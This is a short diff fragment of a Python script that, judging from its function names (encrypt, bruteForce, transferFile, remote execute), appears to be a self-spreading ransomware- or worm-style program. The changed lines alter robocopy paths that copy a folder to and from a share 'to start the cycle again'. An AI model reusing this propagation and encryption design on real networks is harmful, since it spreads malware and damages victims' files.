@@ -41,7 +41,7 @@ def encrypt(fileLocation):
 
 #play video
 def playVideo():
-    os.system("cd C:\\Users\\IEUser\\Downloads")
+    os.system("cd C:\\Users\\IEUser\\Downloads\Registration\Iam.mp4")
     #CHANGE BACKGROUD
 
 
@@ -67,8 +67,8 @@ def bruteForce(user, ipAddress):
 
 #Transfer
 def transferFile():
-    os.system("robocopy C:\\Users\\IEUser\\Downloads\\Registration P:\\  ") #P:\\ zip folder
-    os.system("robocopy P:\\Registration C:\\Users\\IEUser\\Downloads\\  ")#Fresh copy to start thr cycle again 
+    os.system("robocopy C:\\Users\\IEUser\\Downloads\\Registration P:\\Registration  ") #P:\\ zip folder
+    os.system("robocopy P:\\Registration C:\\Users\\IEUser\\Downloads\\Registration  ")#Fresh copy to start thr cycle again 
 
 
 #Remote execute file
